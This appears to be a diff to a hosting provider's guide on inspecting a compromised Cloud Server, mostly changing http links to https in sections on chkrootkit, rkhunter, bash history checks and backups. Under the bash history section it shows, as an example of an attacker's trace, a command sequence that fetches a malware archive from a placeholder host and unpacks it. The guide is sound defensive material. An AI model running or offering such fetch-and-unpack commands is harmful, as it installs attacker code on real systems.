@@ -68,7 +68,7 @@ The following messages are printed by `chkrootkit` during its tests:
 -  `not found` - the command to be tested is not found
 -  `Vulnerable but disabled` - the command is infected
 
-For more options and information on using `chkrootkit`, see <http://www.chkrootkit.org/README>.
+For more options and information on using `chkrootkit`, see <https://www.chkrootkit.org/README>.
 
 #### Scan for rootkits with rkhunter
 
@@ -80,9 +80,9 @@ properties and values.
 
         cd ~/sources
 
-2. Download the latest version of `rkhunter` from the [SourceForge download area](http://sourceforge.net/projects/rkhunter/files/):
+2. Download the latest version of `rkhunter` from the [SourceForge download area](https://sourceforge.net/projects/rkhunter/files/):
 
-        http://sourceforge.net/projects/rkhunter/files/
+        https://sourceforge.net/projects/rkhunter/files/
 
 3. After you install `rkhunter`, run it against `/mnt/demo`.
 
@@ -91,7 +91,7 @@ properties and values.
 `rkhunter` produces warnings during the tests that indicate where a file has
 deviated from expected defaults. Following the test, you can check the log to
 see more detailed information about which files produced the warning. For more
-options and information on using `rkhunter`, see <http://rkhunter.cvs.sourceforge.net/viewvc/rkhunter/rkhunter/files/README>.
+options and information on using `rkhunter`, see <https://rkhunter.cvs.sourceforge.net/viewvc/rkhunter/rkhunter/files/README>.
 
 ### Check last commands
 
@@ -104,7 +104,7 @@ most important **.bashhistory** file is the one belonging to root: **/root/.bash
 
 A compromised Cloud Server might have entries like the following ones:
 
-    wget http://malware.tar.gz
+    wget https://malware.tar.gz
     gunzip malware.tar.gz
     tar xf malware.tar
 
@@ -189,7 +189,7 @@ other unforeseen mishaps, the possibility of data loss is real. To avoid the
 disruption such a loss can cause, back up your files regularly. Following are
 some options to help you secure your files:
 
--   [Rackspace Cloud Backup](http://www.rackspace.com/cloud/backup/) is a good
+-   [Rackspace Cloud Backup](https://www.rackspace.com/cloud/backup/) is a good
 choice for Cloud Servers customers. It is fully integrated with Cloud Servers,
 and is a file-based backup alternative to whole image server backup.
 -   For those who prefer to do it themselves, see [Back up your files with rsync](/how-to/backing-up-your-files-with-rsync/).
